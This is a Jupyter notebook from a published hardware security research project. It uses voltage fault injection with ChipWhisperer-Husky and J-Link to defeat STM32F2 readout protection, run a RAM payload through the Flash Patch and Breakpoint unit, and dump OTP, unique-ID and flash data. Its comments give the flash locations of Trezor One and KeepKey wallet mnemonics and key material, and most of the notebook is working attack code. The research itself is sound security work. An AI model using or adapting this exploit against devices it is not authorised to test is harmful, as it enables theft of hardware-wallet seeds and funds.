## 3b_stm32_f2_attack_vfi

### STM32F2 Code Protection Defeat and Memory Extraction

Authors: [Joe Grand](https://joegrand.com) and [Lennert Wouters](https://x.com/lennertwo)

This notebook uses VFI to downgrade from RDP2 to RDP1 and then exploit the Flash Patch and Breakpoint Unit (FPB). Upon success, our custom payload will execute from RAM and accept commands to extract the desired data from the target device via the UART interface.

Requires [ChipWhisperer-Husky](https://www.newae.com/products/nae-cwhusky), [NewAE CW308 UFO Board](https://rtfm.newae.com/Targets/CW308%20UFO/), [Segger J-Link](https://www.segger.com/products/debug-probes/j-link/), and [STM32F2](https://www.st.com/en/microcontrollers-microprocessors/stm32f2-series.html) with socket/adapter board.

Resources:

* [Main project page](https://grandideastudio.com/portfolio/security/stm32-fault-injection/)
* [GitHub repository](https://github.com/joegrand/stm32-fault-injection/)
* License: [GNU General Public License v3.0 or later](https://github.com/joegrand/stm32-fault-injection/blob/master/LICENSE.txt)

<img src="./img/vfi_platform_f2.jpg" style="width: 50%;">

In [ ]:
from cwwrapper_vfi import *
import time
import serial
from stmbl import *
from tqdm.notebook import tqdm
import random
import itertools  
from bokeh.plotting import figure, show
from bokeh.io import output_notebook, push_notebook
from bokeh.layouts import column
from bokeh.palettes import Dark2_5 as palette
import numpy as np
import pylink
import struct
import zlib

## 1. Initial setup

### 1.1 ChipWhisperer-Husky
`ScopeWrapper` is convenience wrapper over the `Scope` class that adds some convenience functions.

In [ ]:
try:
    scope.dis()        # Ensure the ChipWhiserer is closed
except:
    pass
    
scope = ScopeWrapper()

print("\nChipWhisperer Python Version:", cw.__version__)
print("ChipWhisperer Serial Number:", scope.sn)

In [ ]:
# When using the CW308 with a ribbon cable
scope.io.tio1 = 'serial_rx'
scope.io.tio2 = 'serial_tx'

In [ ]:
scope.scopetype.usart.init(115200, stopbits=1, parity="even")
stbl = StmBl(scope.scopetype.usart, debug=False)

### 1.2 Segger J-Link

In [ ]:
def pylink_init():
    # https://pylink.readthedocs.io/en/latest/
    global jlink
    
    jlink = pylink.JLink()
    
    if jlink.opened() == False:
        jlink.open()
    
    jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG)   # Set Target Interface as JTAG
    
    print(jlink.product_name)

In [ ]:
# Retrieve IDCODE via low-level JTAG SHIFTDR, does not connect to target
def pylink_idcode():
    jlink.open()
    jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG)   # Set Target Interface as JTAG
    jlink.jtag_raw_rw([0], [0x1F], 5)         # JTAG Reset (TMS = 1 for 5 bits)
    jlink.jtag_raw_rw([0], [0x02], 4)         # JTAG ID read (IDCODE should be in DR upon TAP reset)
    result = jlink.jtag_raw_rw([0]*8, [0]*8)  # Shift to see what's on scan chain
    hex_id = hex(struct.unpack("<I", bytes(result[0:4]))[0])    
    return(hex_id)

In [ ]:
pylink_init()

In [ ]:
pylink_idcode()

## 2. RDP Downgrade + FPB

With successful fault injection of the STM32 during power-up, RDP2 will be downgraded to RDP1. This enables JTAG/SWD, bootloader, and access to RAM. We then load our payload into RAM and exploit the Flash Patch and Breakpoint Unit (FPB) in order to get the payload to execute. Then, we can send commands to the payload to extract the desired data from Flash memory.

### 2.1 Setup SAD trigger for downgrade glitch

1. Take a few side-channel measurements during a power cycle, we use the nRST signal as a trigger
2. Select a pattern for SAD triggering
3. Verify that SAD triggering works reliably

In [ ]:
scope.nrst_trigger()
scope.adc.bits_per_sample = 8
scope.adc.samples = 50000

scope.gain.db = 38
scope.adc.clip_errors_disabled = True
scope.adc.lo_gain_errors_disabled = True
scope.errors.clear()

In [ ]:
ntraces = 5
nrst_traces = np.zeros((ntraces, scope.adc.samples), dtype='uint8')

scope.disable_glitch()
scope.io.nrst = 'high_z'
scope.io.pdic = True

for i in tqdm(range(ntraces)):
    scope.arm()
    scope.io.target_pwr = False
    time.sleep(0.2)
    scope.io.target_pwr = True
    scope.capture(poll_done=True)
    nrst_traces[i] = scope.get_last_trace(as_int=True)

In [ ]:
scope.simple_plot(nrst_traces, 5)

In [ ]:
end = X   # End of reference trace, value needs to be determined through characterization
sad_pattern = nrst_traces[0][end-200:end]

In [ ]:
scope.trigger.module = 'SAD'
scope.adc.samples = 20000
scope.adc.presamples = 5000

scope.SAD.reference = sad_pattern
scope.SAD.interval_threshold = 20
scope.SAD.threshold = 60

In [ ]:
ntraces = 10
sad_traces = np.zeros((ntraces, scope.adc.samples), dtype='uint8')

scope.disable_glitch()

scope.io.nrst = 'high_z'
scope.io.pdic = True

for i in tqdm(range(ntraces)):
    scope.arm()
    scope.io.target_pwr = False
    time.sleep(0.0015)
    scope.io.target_pwr = True
    scope.capture(poll_done=True)
    sad_traces[i] = scope.get_last_trace(as_int=True)

In [ ]:
scope.simple_plot(sad_traces, 5)

### 2.2 Downgrade, load payload, downgrade

In [ ]:
# Glitch width range needs to be determined through characterization
glitch_width_start = 60
glitch_width_end = 100

# Typical offset range
glitch_offset_start = 1000
glitch_offset_end = 2000

#### Core glitch loop

In [ ]:
global downgrade_offset
global downgrade_width

scope.scopetype.usart.init(115200, stopbits=1, parity="even")

scope.enable_glitch()
scope.io.glitch_lp = True
scope.io.nrst = 'high_z'

def generator():
    while True:
        yield

#for i in tqdm(range(100), desc=f"Attempting downgrade"):
for _ in tqdm(generator()):       
    goffset = random.randint(glitch_offset_start, glitch_offset_end)
    gwidth = random.randint(glitch_width_start, glitch_width_end)
    scope.glitch.ext_offset = goffset
    scope.glitch.repeat = gwidth

    scope.io.tio3 = False
    scope.io.pdic = True              # Set BOOT0 HIGH to enter STM32 Serial Bootloader
    scope.arm()                       # Arm ChipWhisperer
    scope.io.target_pwr = False
    time.sleep(0.0015)
    scope.io.target_pwr = True
    scope.capture(poll_done=True)     # Capture trace
    
    try:
        idc = pylink_idcode()
        if (idc != '0xffffffff' and idc != '0x0'):
            jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG)
            jlink.connect('STM32F205RG')
            print(f"Successful downgrade: width {gwidth}, offset {goffset}, ID {idc}")
            downgrade_offset = goffset
            downgrade_width = gwidth
            break

    except Exception as e:
        print(e)
        pylink_init()
        continue

    except KeyboardInterrupt:
        break
        
scope.disable_glitch()

In [ ]:
with open('./bin/payload_f2.bin', 'rb') as f:
    payload = f.read()

jlink.memory_write(0x20000000, payload)
readback = bytes(jlink.memory_read(0x20000000, len(payload)))
assert readback == payload
jlink.close()

In [ ]:
def downgrade2(limit = 100):
    scope.scopetype.usart.init(115200, stopbits=1, parity="even")
    
    scope.enable_glitch()
    scope.io.glitch_lp = True
    scope.io.nrst = 'high_z'

    scope.glitch.repeat = downgrade_width
    scope.glitch.ext_offset = downgrade_offset

    for i in tqdm(range(limit), desc=f"Attempting downgrade"):
        try:
            scope.io.tio3 = True
            scope.io.pdic = True
            scope.arm()
            scope.io.target_pwr = False
            time.sleep(0.0015)
            scope.io.target_pwr = True
            scope.capture(poll_done=True)
            time.sleep(0.2)
        
            scope.scopetype.usart.write(bytearray([0x55]))
            time.sleep(0.01)
            ret = scope.scopetype.usart.read()
            if len(ret) > 5:
                break

        except Exception as e:
            print(e)
            pylink_init()
            continue

        except KeyboardInterrupt:
            break
    
    scope.disable_glitch()
    return ret

**Note:** Some target devices that use an internal oscillator may affect the payload in RAM if the first downgrade attempt of `downgrade2()` is unsuccessful and the user code executes. In this case, another round of SAD plots after successful downgrade will show a shift in the first plot compared to the others. This shift can be subtracted from the downgrade offset determined above to hopefully cause the first downgrade attempt to succeed in subsequent runs. For devices that require an external oscillator, the payload should remain intact through multiple downgrade glitch attempts during `downgrade2()`.

In [ ]:
r = downgrade2()
print(r)

scope.io.pdic = False
scope.io.nrst = False
time.sleep(0.05)
scope.io.nrst = True
time.sleep(0.1)
scope.scopetype.usart.write(bytearray([0x55]))
time.sleep(0.01)
r2 = scope.scopetype.usart.read()
print(r2)

## 3. Read data

In [ ]:
FLASH_DUMP = "./output/flash.bin"     # STM32 Flash memory contents
OTP_DUMP   = "./output/otp.bin"       # Hardware entropy data from STM32 OTP
UID_DUMP   = "./output/uid.bin"       # Unique ID from STM32

In [ ]:
def _read_crc(address, length):
    # Send command + address + desired length to payload
    command = bytearray([0x04])  # CMD_READCRC
    command += address.to_bytes(4, 'little')
    command += length.to_bytes(4, 'little')
    scope.scopetype.usart.write(command)

    # Read and verify address + length parameters from payload
    r = scope.scopetype.usart.read(8)
    assert len(r) == 8 #, f"cmd_len {len(r)}"
    r_address = int.from_bytes(r[0:4], 'little')
    r_length = int.from_bytes(r[4:8], 'little')
    assert r_address == address #, f"r_addr {r_address:#010x}, addr {address:#010x}"
    assert r_length == length #, f"r_len {r_length:#010x}, len {length:#010x}"

    # Read data from payload and verify length
    data = scope.scopetype.usart.read(length)
    assert len(data) == length #, f"rx {len(data)}"

    # Read CRC32 from payload and verify it with our own computed result
    r_crc = scope.scopetype.usart.read(4)
    r_crc = int.from_bytes(r_crc, 'little')
    crc = zlib.crc32(data)
    assert r_crc == crc #, f"r_crc {r_crc:#010x}, crc {crc:#010x}"
    
    return data

def _read_retry(addr, size):
    timeout = 10   # Length of time (in seconds) to attempt retries
    start = time.monotonic()
        
    while True:
        try:
            return _read_crc(addr, size)
            
        except AssertionError as e:
            if timeout is not None and (time.monotonic() - start) > timeout:
                raise TimeoutError(f"Read timed out at address {addr:#010x}")
          
            #print(e)
            time.sleep(0.01)  # Wait before trying again
            pass    

In [ ]:
def read_data(address, length):
    block_size  = 256
    full_blocks = length // block_size
    remainder   = length % block_size

    buf = bytearray()

    for i in range(full_blocks):   # Read full blocks
        addr = address + (i * block_size)
        buf.extend(_read_retry(addr, block_size))

    if remainder:   # Read the remainder (partial block)
        addr = address + (full_blocks * block_size)
        buf.extend(_read_retry(addr, remainder))

    return bytes(buf)

In [ ]:
scope.scopetype.usart.read()

In [ ]:
# STM32 OTP (One Time Programmable) Area
# 0x1FFF7800 - 0x1FFF7A0F, 528 bytes per STM32F205xx Reference Manual Table 2 and STM32F405xx Reference Manual Table 5
# Trezor uses OTP Block 3: Entropy/Randomness, 256 bits (32 bytes): 0x1FFF7860 - 0x1FFF787F
# https://docs.trezor.io/trezor-firmware/core/misc/memory.html

data = read_data(0x1FFF7860, 32)
print(f"{data.hex(sep=' ')}")

with open(OTP_DUMP, 'wb') as file:
    file.write(data)

In [ ]:
# STM32 Unique Device ID, 96 bits (12 bytes)
# Base address 0x1FFF7A10 per STM32F205xx Reference Manual section 33.1 and STM32F405xx Reference Manual section 39.1

data = read_data(0x1FFF7A10, 12)

if data:
    print(f"Response:\n{data.hex(sep=' ')}")

    # Reverse order in 4-byte blocks (needed for Trezor One)
    # Ex.: '1b 00 36 00 0b 47 37 33 36 31 30 38' becomes '36 31 30 38 0b 47 37 33 1b 00 36 00'
    data_rev = b''.join(reversed([data[i:i+4] for i in range(0, 12, 4)]))
    print(f"Processed:\n{data_rev.hex(sep=' ')}")

    with open(UID_DUMP, 'wb') as file:
        file.write(data_rev)

In [ ]:
# STM32 Flash Memory
# 0x08000000 - 0x0807FFFF, Trezor One: STM32F205RET6 (512KB)
# 0x08000000 - 0x080FFFFF, Trezor One: STM32F205RGT6 1024KB (1MB)

# Trezor Model One mnemonic stored in cleartext in FW < 1.8.0
# Sector 2: Metadata Area (16KB): 0x08008000 - 0x0800BFFF

# Trezor Model One encrypted mnemonic and key material depend on FW >= 1.8.0:
# Sector 2: Storage Area (16KB): 0x08008000 - 0x0800BFFF
# OR
# Sector 3: Storage Area (16KB): 0x0800C000 - 0x0800FFFF

# The encrypted mnemonic begins with 0x02 0x01 and varies in length depending on the BIP-39 words used, up to maximum 192 bytes (0xC0)
# The other required encryption values (Salt, EDEK, ESAK, PVC) begins with 0x02 0x00 0x3C 0x00, fixed at 60 bytes
# https://docs.trezor.io/trezor-firmware/storage/index.html

# KeepKey
# Sector 1: Storage/Config (16KB): 0x08004000 - 0x08007FFF
# OR
# Sector 2: Storage/Config (16KB): 0x08008000 - 0x0800BFFF
# OR
# Sector 3: Storage/Config (16KB): 0x0800C000 - 0x0800FFFF

# Location of (encrypted) mnemonic and key material depend on STORAGE_VERSION
# Encryption starts w/ STORAGE_VERSION 11 (0x0B)

#data = read_data(0x08004000, 0x4000)      # Sector 1
#data = read_data(0x08008000, 0x4000)      # Sector 2
data = read_data(0x0800C000, 0x4000)      # Sector 3
#data = read_data(0x08000000, 0x80000)     # Full Memory (512KB)
#data = read_data(0x08000000, 0x100000)    # Full Memory (1MB)

with open(FLASH_DUMP, 'wb') as file:
    file.write(data)

In [ ]:
# Trezor One < 1.8.0

# Display any printable ASCII data within the extracted binary
result = subprocess.run(['strings', FLASH_DUMP], capture_output=True, text=True)
print(result.stdout)